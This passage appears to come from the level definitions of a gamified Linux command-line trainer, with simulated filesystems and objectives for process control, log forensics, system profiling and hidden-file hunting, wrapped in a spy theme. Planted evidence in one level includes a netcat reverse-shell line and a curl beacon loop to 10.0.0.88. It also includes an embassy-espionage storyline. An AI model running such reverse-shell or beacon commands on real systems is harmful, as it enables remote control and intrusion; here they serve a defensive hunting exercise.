                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('MISSION')
                },
                {
                    id: 5,
                    task: 'EXTEND: Add Tools to PATH',
                    hint: 'Extend PATH: export PATH=$PATH:/opt/shadow-tools',
                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('PATH') && cmd.includes('/opt')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What alias is defined in the operator's .bashrc file?",
                acceptedAnswers: ["ll", "ls -la", "ll="],
                hint: "Read the .bashrc file to see what shortcuts are configured.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Alias not found. Check cat .bashrc for defined aliases.",
                correctAnswerMessage: "Confirmed: 'll' alias maps to 'ls -la'. Shell configured."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-014: Process Control
        // Theme: Process management and termination
        // ──────────────────────────────────────────────────────────
        'CLH-014': {
            title: 'Process Control',
            description: 'Manage and terminate processes. Master kill, jobs, bg, fg, and nohup.',
            prerequisites: ['CLH-013'],
            tier: 'CLI Phantom',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'intel', 'scripts', 'logs', '.bash_history', '.process_cheatsheet']
                },
                '/home/operator/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `#!/bin/bash
# Continuous monitoring script
# Run with: nohup ./monitor.sh &
while true; do
  date >> /tmp/monitor.log
  ps aux >> /tmp/process_snapshot.log
  sleep 60
done`
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'incident_report.txt', 'kill_targets.txt']
                },
                '/home/operator/intel/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Known malicious processes:

CRYPTOMINERS:
- rogue_agent (cryptominer) - PID typically 6666
  Uses high CPU, connects to mining pools

BACKDOORS:
- backdoor_shell (reverse shell)
- keylogger_x (keylogger)

Action: Terminate with kill -9 if SIGTERM fails.`
                },
                '/home/operator/intel/incident_report.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `INCIDENT REPORT - IR-2026-0147
=============================
Date: 2026-01-19
Severity: HIGH

Anomaly detected on production server.
CPU usage spiked to 98% at 09:15.

Initial analysis suggests cryptominer activity.
Process running as 'nobody' user - possible privilege escalation.

REQUIRED ACTIONS:
1. Identify rogue process (ps aux | grep)
2. Terminate the process (kill PID)
3. Establish persistent monitoring (nohup)`
                },
                '/home/operator/intel/kill_targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `APPROVED FOR TERMINATION
========================
PID: 6666 - rogue_agent (cryptominer)

DO NOT KILL:
- PID 1 (init)
- PID 345 (sshd)
- PID 456 (cron)
- PID 789 (nginx)`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['cleanup.sh', 'watchdog.sh']
                },
                '/home/operator/scripts/cleanup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `#!/bin/bash
# Cleanup script - terminates known bad processes
killall rogue_agent 2>/dev/null
killall backdoor_shell 2>/dev/null
echo "Cleanup complete"`
                },
                '/home/operator/scripts/watchdog.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `#!/bin/bash
# Watchdog - monitor for suspicious processes
# Run with: nohup ./scripts/watchdog.sh &
while true; do
  pgrep -f "rogue|backdoor|miner" && echo "ALERT: Threat detected!"
  sleep 30
done`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['process_history.log', 'alerts.log']
                },
                '/home/operator/logs/process_history.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 478,
                    content: `[2026-01-19 08:00:01] System boot complete
[2026-01-19 08:00:12] sshd started (PID 345)
[2026-01-19 08:00:15] cron started (PID 456)
[2026-01-19 08:00:18] nginx started (PID 789)
[2026-01-19 09:15:33] ALERT: Unknown process spawned
[2026-01-19 09:15:33] Process: rogue_agent (PID 6666)
[2026-01-19 09:15:34] User: nobody (unexpected!)
[2026-01-19 09:15:35] CPU: 98.5% (CRITICAL)
[2026-01-19 09:15:36] Network: Outbound connection to evil.pool:3333`
                },
                '/home/operator/logs/alerts.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `SECURITY ALERT LOG
==================
[09:15:35] HIGH: Cryptominer detected - rogue_agent PID 6666
[09:15:36] HIGH: Unauthorized mining pool connection
[09:16:01] MEDIUM: Process consuming excessive CPU
[09:20:00] INFO: Awaiting operator intervention`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `ps aux
ps aux | grep rogue
kill 6666
jobs
nohup ./monitor.sh &`
                },
                '/home/operator/.process_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║           PROCESS CONTROL CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

VIEWING PROCESSES
─────────────────
ps aux              All processes, BSD style
ps -ef              All processes, System V style
top                 Real-time process monitor
pgrep <name>        Find PID by name

TERMINATING PROCESSES
────────────────────
kill <PID>          Send SIGTERM (graceful shutdown)
kill -9 <PID>       Send SIGKILL (force kill)
killall <name>      Kill all processes by name
pkill <pattern>     Kill by pattern match

SIGNALS
───────
SIGTERM (15)        Request termination (default)
SIGKILL (9)         Force kill (cannot be caught)
SIGSTOP (19)        Pause process
SIGCONT (18)        Resume process
SIGHUP (1)          Hangup - used to reload config

JOB CONTROL
───────────
command &           Run in background
jobs                List background jobs
fg %<n>             Bring job to foreground
bg %<n>             Continue job in background
Ctrl+Z              Suspend current job

PERSISTENT PROCESSES
───────────────────
nohup cmd &         Run immune to hangups
disown              Remove job from shell
screen              Terminal multiplexer
tmux                Modern terminal multiplexer`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List Running Processes',
                    hint: 'Show all processes: ps aux',
                    check: (cmd, state, output) => cmd.includes('ps') &&
                        (cmd.includes('aux') || cmd.includes('-ef') || cmd.includes('-e')) &&
                        output && (output.includes('PID') || output.includes('COMMAND'))
                },
                {
                    id: 2,
                    task: 'HUNT: Find Suspicious Process',
                    hint: 'Filter processes: ps aux | grep rogue',
                    check: (cmd, state, output) => cmd.includes('ps') && cmd.includes('grep') &&
                        output && (output.includes('rogue') || output.includes('6666'))
                },
                {
                    id: 3,
                    task: 'TERMINATE: Kill by PID',
                    hint: 'Kill process: kill 6666',
                    check: (cmd, state, output) => cmd.includes('kill') && cmd.includes('6666') &&
                        output && output.includes('Terminated')
                },
                {
                    id: 4,
                    task: 'MANAGE: View Background Jobs',
                    hint: 'List jobs: jobs',
                    check: (cmd, state) => cmd.trim() === 'jobs'
                },
                {
                    id: 5,
                    task: 'PERSIST: Run Immune to Hangup',
                    hint: 'Run persistent: nohup ./monitor.sh &',
                    check: (cmd, state, output) => cmd.includes('nohup') &&
                        output && output.includes('nohup.out')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to intel, what is the name of the cryptominer process?",
                acceptedAnswers: ["rogue_agent", "rogue agent", "rogueagent"],
                hint: "Check the processes.txt file in the intel directory for known threats.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Process not recognized. Review intel/processes.txt for malicious process names.",
                correctAnswerMessage: "Threat identified: rogue_agent (cryptominer). Terminate with extreme prejudice."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-015: Capstone Mission
        // Theme: Final comprehensive challenge
        // ──────────────────────────────────────────────────────────
        'CLH-015': {
            title: 'Capstone Mission',
            description: 'Operation Shadowstrike. Apply all skills to investigate a compromised server.',
            prerequisites: ['CLH-014'],
            tier: 'CLI Phantom',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission_brief.txt', '.bash_history', '.investigation_cheatsheet']
                },
                '/home/operator/mission_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 512,
                    content: `OPERATION SHADOWSTRIKE - MISSION BRIEFING
==========================================
Classification: CONFIDENTIAL
Operator: ${new Date().toISOString().split('T')[0]}

SITUATION:
Server "shadow" has been compromised. Security team has
collected evidence in /evidence directory.

MISSION:
Analyze the evidence and identify the threat actor.

OBJECTIVES:
1. Navigate to evidence directory
2. Analyze web access logs for POST requests
3. Extract unique IPs from authentication failures
4. Review exfiltration activity
5. Document findings

ATTACKER IS BELIEVED TO BE ACTIVE - PROCEED WITH CAUTION`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `cd /evidence
ls -la
grep "POST" access.log
grep "FAILED" auth.log
cat timeline.txt`
                },
                '/home/operator/.investigation_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 678,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          INCIDENT RESPONSE CHEATSHEET                         ║
╚═══════════════════════════════════════════════════════════════╝

LOG ANALYSIS
────────────
grep "POST" access.log         Find form submissions
grep "401\\|403" access.log     Find auth failures (HTTP)
grep "FAILED" auth.log         Find SSH/login failures
grep -c "pattern" file         Count occurrences

EXTRACT UNIQUE VALUES
────────────────────
cut -d " " -f 1 file           Extract first field (space delimited)
cut -d "," -f 2 file           Extract second field (comma delimited)
sort | uniq                    Sort and deduplicate
sort | uniq -c                 Count unique occurrences

TIMELINE CONSTRUCTION
────────────────────
grep "timestamp" *.log         Find events at specific time
head -n 10 file                View first 10 lines
tail -n 10 file                View last 10 lines
wc -l file                     Count total lines

REPORTING
─────────
echo "Finding" >> report.txt   Append to report
cat log | grep X > findings    Save filtered results`
                },
                '/evidence': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'root',
                    children: ['access.log', 'auth.log', 'exfil.log', 'timeline.txt']
                },
                '/evidence/access.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 678,
                    content: `192.168.1.105 - - [15/Jan/2024:03:42:15] "GET /index.html" 200
192.168.1.105 - - [15/Jan/2024:03:43:22] "GET /admin/login.php" 200
10.0.0.88 - - [15/Jan/2024:03:44:01] "POST /admin/login.php" 401
10.0.0.88 - - [15/Jan/2024:03:44:15] "POST /admin/login.php" 401
10.0.0.88 - - [15/Jan/2024:03:44:33] "POST /admin/login.php" 200
10.0.0.88 - - [15/Jan/2024:03:45:12] "GET /admin/users.php" 200
10.0.0.88 - - [15/Jan/2024:03:46:01] "POST /admin/export.php" 200
10.0.0.88 - - [15/Jan/2024:03:47:22] "POST /admin/upload.php" 200
10.0.0.88 - - [15/Jan/2024:03:48:45] "GET /admin/config.php" 200
192.168.1.42 - - [15/Jan/2024:03:50:01] "GET /index.html" 200`
                },
                '/evidence/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 456,
                    content: `Jan 15 03:42:01 shadow sshd[1234]: success login for admin from 192.168.1.105
Jan 15 03:43:15 shadow sshd[1235]: FAILED login for root from 10.0.0.88
Jan 15 03:43:22 shadow sshd[1235]: FAILED login for admin from 10.0.0.88
Jan 15 03:43:45 shadow sshd[1235]: FAILED login for operator from 10.0.0.88
Jan 15 03:44:01 shadow sshd[1235]: FAILED login for root from 10.0.0.88
Jan 15 03:44:33 shadow sshd[1236]: success login for admin from 10.0.0.88
Jan 15 03:50:15 shadow sshd[1237]: success login for operator from 192.168.1.42`
                },
                '/evidence/exfil.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 378,
                    content: `2024-01-15 03:46:15 TRANSFER 10.0.0.88 -> external user_database.sql 15728640 bytes
2024-01-15 03:46:45 TRANSFER 10.0.0.88 -> external config_backup.tar 2097152 bytes
2024-01-15 03:47:22 TRANSFER 10.0.0.88 -> external ssh_keys.tar.gz 524288 bytes
2024-01-15 03:47:55 TRANSFER 10.0.0.88 -> external passwords.csv 1048576 bytes
2024-01-15 03:48:30 TRANSFER 10.0.0.88 -> external shadow_copy 4096 bytes`
                },
                '/evidence/timeline.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'root',
                    group: 'root',
                    size: 456,
                    content: `INCIDENT TIMELINE - Operation Shadowstrike
============================================
03:42 - Normal admin login from 192.168.1.105
03:43 - Brute force attempts begin from 10.0.0.88
03:44 - Attacker gains access via compromised credentials
03:45 - Reconnaissance of admin panel begins
03:46 - Mass data exfiltration initiated
03:47 - SSH keys and credentials stolen
03:48 - Configuration files accessed
03:50 - Legitimate user login (unaware of breach)
============================================
ATTACKER IP: 10.0.0.88
STATUS: ACTIVE THREAT`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'PHASE 1: Initial Reconnaissance',
                    hint: 'Navigate to evidence: cd /evidence && ls -la',
                    check: (cmd, state, output) => ((cmd.includes('cd') && cmd.includes('evidence')) ||
                               (cmd.includes('ls') && cmd.includes('evidence'))) &&
                               (output && (output.includes('access.log') || output.includes('/evidence')))
                },
                {
                    id: 2,
                    task: 'PHASE 2: Log Analysis',
                    hint: 'Find POST requests: grep "POST" /evidence/access.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('POST') && cmd.includes('access') &&
                               output && output.includes('POST')
                },
                {
                    id: 3,
                    task: 'PHASE 3: Extract Attacker IPs',
                    hint: 'Extract unique IPs: grep FAILED /evidence/auth.log | cut -d " " -f 6 | sort | uniq',
                    check: (cmd, state, output) => cmd.includes('uniq') && (cmd.includes('auth') || cmd.includes('FAILED')) &&
                               output && output.includes('10.0.0.88')
                },
                {
                    id: 4,
                    task: 'PHASE 4: Identify Exfiltration',
                    hint: 'Find large transfers: grep -E "[0-9]{7,}" /evidence/exfil.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('exfil') &&
                               output && (output.includes('TRANSFER') || output.includes('bytes'))
                },
                {
                    id: 5,
                    task: 'PHASE 5: Generate Report',
                    hint: 'Save report: echo "Investigation Complete" > /evidence/report.txt',
                    check: (cmd, state, output) => cmd.includes('>') && cmd.includes('report') &&
                               output && output.includes('Redirected')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What is the attacker's IP address?",
                acceptedAnswers: ["10.0.0.88", "10.0.0.88."],
                hint: "Check the timeline.txt or auth.log for the threat actor's IP.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "IP not confirmed. Review the evidence logs for the attacker's source.",
                correctAnswerMessage: "ATTACKER CONFIRMED: 10.0.0.88. Intel package ready for command."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-016: System Intel
        // Theme: Embassy workstation profiling before implant deployment
        // ──────────────────────────────────────────────────────────
        'CLH-016': {
            title: 'System Intel',
            description: 'Profile a compromised embassy workstation before deploying collection tools.',
            prerequisites: ['CLH-015'],
            tier: 'CLI Specter',
            user: 'operator',
            hostname: 'EMBASSY-WS-07',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['.ssh', 'intel', 'tools', '.bashrc', '.bash_history', '.sysinfo_cheatsheet']
                },
                '/home/operator/.ssh': {
                    type: 'dir', perms: 'drwx------', owner: 'operator', group: 'operator',
                    children: ['id_rsa', 'id_rsa.pub', 'known_hosts']
                },
                '/home/operator/.ssh/id_rsa': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 1675,
                    content: '-----BEGIN OPENSSH PRIVATE KEY-----\n[REDACTED - OPERATIONAL KEY]\n-----END OPENSSH PRIVATE KEY-----'
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 78,
                    content: `uname -a
lscpu
free -h
df -h
du -sh /home`
                },
                '/home/operator/.sysinfo_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          SYSTEM PROFILING CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

ARCHITECTURE INFO
────────────────
uname -a             Full system info
uname -r             Kernel version
arch                 CPU architecture
hostnamectl          System/OS details

CPU PROFILING
────────────
lscpu                CPU architecture info
nproc                Number of processors
cat /proc/cpuinfo    Detailed CPU info

MEMORY ASSESSMENT
────────────────
free -h              Human-readable memory
cat /proc/meminfo    Detailed memory info
vmstat               Virtual memory stats

DISK ANALYSIS
────────────
df -h                Filesystem space
du -sh /path         Directory size
lsblk                Block devices
fdisk -l             Disk partitions`
                },
                '/home/operator/intel': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['notes.txt', 'targets.list']
                },
                '/home/operator/intel/notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: 'OPERATION IRON HARVEST\n======================\nTarget: Embassy IT Admin Workstation\nAccess: SSH key compromise\nObjective: Profile system for implant deployment\n'
                },
                '/home/operator/intel/targets.list': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 189,
                    content: `HIGH VALUE TARGETS
==================
/home/ambassador/.classified/
/data/diplomatic-cables/
/data/backups/

SECONDARY TARGETS
=================
/home/attache/reports/
/home/attache/schedules/`
                },
                '/home/operator/tools': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['recon.sh', 'exfil.py']
                },
                '/home/operator/tools/recon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'operator', group: 'operator', size: 256,
                    content: `#!/bin/bash
# System profiling script
echo "=== SYSTEM PROFILE ==="
uname -a
echo "=== CPU ==="
lscpu | head -5
echo "=== MEMORY ==="
free -h
echo "=== DISK ==="
df -h`
                },
                '/home/ambassador': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'ambassador', group: 'ambassador',
                    children: ['documents', 'emails', '.classified']
                },
                '/home/ambassador/.classified': {
                    type: 'dir', perms: 'drwx------', owner: 'ambassador', group: 'ambassador',
                    children: ['MAJESTIC-12.pdf', 'TREATY-DRAFT.doc', 'ASSET-LIST.xlsx']
                },
                '/home/attache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'attache', group: 'attache',
                    children: ['reports', 'schedules']
                },
                '/data': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['backups', 'archives', 'diplomatic-cables']
                },
                '/data/diplomatic-cables': {
                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'staff',
                    children: ['2024-Q1', '2024-Q2', '2024-Q3', '2024-Q4']
                },
            },

            objectives: [
                { id: 1, task: 'IDENTIFY: System Architecture', hint: '$ uname -a',
                  check: (cmd, state, output) => cmd.includes('uname') && output && output.includes('Linux') },
                { id: 2, task: 'PROFILE: CPU Capabilities', hint: '$ lscpu',
                  check: (cmd, state, output) => cmd.includes('lscpu') && output && output.includes('CPU') },
                { id: 3, task: 'ASSESS: Memory Resources', hint: '$ free -h',
                  check: (cmd, state, output) => cmd.includes('free') && output && output.includes('Mem') },
                { id: 4, task: 'ANALYZE: Disk Space', hint: '$ df -h',
                  check: (cmd, state, output) => cmd.includes('df') && output && output.includes('Filesystem') },
                { id: 5, task: 'ESTIMATE: Target Directory Size', hint: '$ du -sh /home',
                  check: (cmd, state, output) => cmd.includes('du') && cmd.includes('/home') && output && /\d/.test(output) },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What is the operation codename according to the intel notes?",
                acceptedAnswers: ["iron harvest", "operation iron harvest", "ironharvest"],
                hint: "Check the notes.txt file in the intel directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Codename not recognized. Review intel/notes.txt for mission details.",
                correctAnswerMessage: "OPERATION IRON HARVEST confirmed. Implant deployment authorized."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-017: Find & Locate
        // Theme: Mole hunt - finding hidden files and backdoors
        // ──────────────────────────────────────────────────────────
        'CLH-017': {
            title: 'Find & Locate',
            description: 'Hunt for trojans and hidden files planted by a mole on a compromised system.',
            prerequisites: ['CLH-016'],
            tier: 'CLI Specter',
            user: 'hunter',
            hostname: 'BLACKSITE-7',
            startDir: '/home/hunter',
            allowedCommands: null,

            filesystem: {
                '/home/hunter': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['toolkit', 'reports', '.bashrc', '.bash_history', '.find_cheatsheet']
                },
                '/home/hunter/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'hunter', group: 'hunter', size: 156,
                    content: `find /home -name ".*" -type f
find / -perm -4000 2>/dev/null
find /tmp -type f
find / -mtime -1 -type f 2>/dev/null
which sudo`
                },
                '/home/hunter/.find_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 678,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║          FILE HUNTING CHEATSHEET                              ║
╚═══════════════════════════════════════════════════════════════╝

FIND BY NAME
────────────
find /path -name "filename"       Exact match
find /path -name "*.log"          Wildcard match
find /path -name ".*"             Hidden files (dot files)
find /path -iname "file"          Case-insensitive

FIND BY TYPE
───────────
find /path -type f                Regular files only
find /path -type d                Directories only
find /path -type l                Symbolic links

FIND BY PERMISSIONS
──────────────────
find / -perm -4000                SUID files (priv esc)
find / -perm -2000                SGID files
find / -perm -o+w                 World-writable files

FIND BY TIME
───────────
find / -mtime -1                  Modified in last 24h
find / -mtime +30                 Modified 30+ days ago
find / -atime -7                  Accessed in last week
find / -newer /etc/passwd         Newer than reference file

LOCATE (Fast Index Search)
─────────────────────────
locate filename                   Search index
whereis command                   Find binary/man pages
which command                     Find executable path`
                },
                '/home/hunter/toolkit': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['scanner.sh', 'hasher.py']
                },
                '/home/hunter/toolkit/scanner.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'hunter', group: 'hunter', size: 256,
                    content: `#!/bin/bash
# Threat hunting scanner
echo "=== SUID FILES ==="
find / -perm -4000 2>/dev/null
echo "=== HIDDEN FILES ==="
find /home -name ".*" -type f
echo "=== RECENT CHANGES ==="
find / -mtime -1 -type f 2>/dev/null`
                },
                '/home/hunter/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'hunter', group: 'hunter',
                    children: ['README.txt']
                },
                '/home/hunter/reports/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'hunter', group: 'hunter', size: 89,
                    content: 'Save your threat findings here.\nExample: find /tmp -type f > reports/tmp_files.txt'
                },
                '/home/analyst': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.bashrc', '.secret_keys', '.backdoor.sh', '.classified']
                },
                '/home/analyst/.secret_keys': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst', size: 512,
                    content: '[SUSPICIOUS] API keys and credentials stored in hidden file'
                },
                '/home/analyst/.backdoor.sh': {
                    type: 'file', perms: '-rwx------', owner: 'analyst', group: 'analyst', size: 1024,
                    content: '#!/bin/bash\n# TROJAN - Reverse shell to mole C2\nnc -e /bin/bash 10.0.0.88 4444'
                },
                '/home/mole': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['.exfil_staging', '.local']
                },
                '/home/mole/.exfil_staging': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['classified_docs.tar.gz']
                },
                '/home/mole/.local': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['pwn']
                },
                '/home/mole/.local/pwn': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 8192,
                    content: '[SUID BINARY - Privilege escalation backdoor]'
                },
                '/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['.cache', '.hidden', 'beacon.sh']
                },
                '/tmp/.cache': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
                    children: ['rootshell']
                },
                '/tmp/.cache/rootshell': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 16384,
                    content: '[SUID BACKDOOR in /tmp - HIGHLY SUSPICIOUS]'
                },
                '/tmp/.hidden': {
                    type: 'dir', perms: 'drwx------', owner: 'mole', group: 'mole',
                    children: ['exfil.tar', 'keylogger']
                },
                '/tmp/beacon.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'mole', group: 'mole', size: 256,
                    content: '#!/bin/bash\nwhile true; do curl -s http://10.0.0.88/beacon; sleep 300; done'
                },
                '/var/tmp': {
                    type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root',
                    children: ['privesc']
                },
                '/var/tmp/privesc': {
                    type: 'file', perms: '-rwsr-xr-x', owner: 'root', group: 'root', size: 4096,
                    content: '[PRIVILEGE ESCALATION TOOL]'
                },
            },

            objectives: [
                { id: 1, task: 'HUNT: Hidden Dot-Files', hint: '$ find /home -name ".*" -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-name') && cmd.includes('.*') &&
                         output && (output.includes('.') || output.includes('No matches'))  },
                { id: 2, task: 'LOCATE: SUID Backdoors', hint: '$ find / -perm -4000 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
                         output && (output.includes('rws') || output.includes('/')) },
                { id: 3, task: 'SEARCH: Temp Directory Drops', hint: '$ find /tmp -type f',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('/tmp') &&
                         output && (output.includes('/tmp') || output.includes('beacon') || output.includes('No matches')) },
                { id: 4, task: 'TRACK: Recent Modifications', hint: '$ find / -mtime -1 -type f 2>/dev/null',
                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-mtime') },
                { id: 5, task: 'VERIFY: Binary Locations', hint: '$ which sudo && whereis bash',
                  check: (cmd, state, output) => (cmd.includes('which') || cmd.includes('whereis')) &&
                         output && output.includes('/') },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What port does the analyst's backdoor connect to?",
                acceptedAnswers: ["4444", "port 4444", "4444."],
                hint: "Read the .backdoor.sh file in /home/analyst to see the C2 connection details.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Port not confirmed. Check the backdoor script for netcat parameters.",
                correctAnswerMessage: "C2 PORT CONFIRMED: 4444. Mole's communication channel identified."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-018: Archive Operations
        // Theme: Dead drop - extracting and packaging intel
        // ──────────────────────────────────────────────────────────
        'CLH-018': {
            title: 'Archive Operations',
            description: 'Extract intel packages from dead drops and prepare them for exfiltration.',
            prerequisites: ['CLH-017'],
            tier: 'CLI Specter',
            user: 'courier',
            hostname: 'DEAD-DROP',
            startDir: '/home/courier',
            allowedCommands: null,

            filesystem: {
                '/home/courier': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['incoming', 'outgoing', 'staging', '.bashrc']
                },
                '/home/courier/incoming': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['package_alpha.tar.gz', 'package_beta.zip', 'encrypted_bundle.tar.gpg']
                },
                '/home/courier/incoming/package_alpha.tar.gz': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 2097152,
                    content: '[COMPRESSED ARCHIVE - tar.gz format]'
                },
                '/home/courier/incoming/package_beta.zip': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 1048576,
                    content: '[COMPRESSED ARCHIVE - zip format]'
                },
                '/home/courier/incoming/encrypted_bundle.tar.gpg': {
                    type: 'file', perms: '-rw-------', owner: 'courier', group: 'courier', size: 4194304,
                    content: '[GPG ENCRYPTED ARCHIVE - Requires handler key]'
                },
                '/home/courier/outgoing': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: []
                },
                '/home/courier/staging': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'courier', group: 'courier',
                    children: ['manifest.txt']
                },
                '/home/courier/staging/manifest.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'courier', group: 'courier', size: 256,
                    content: 'DEAD DROP MANIFEST\n==================\nPackage Alpha: SIGINT intercepts\nPackage Beta: Asset photographs\nEncrypted Bundle: HUMINT reports\n'
                },
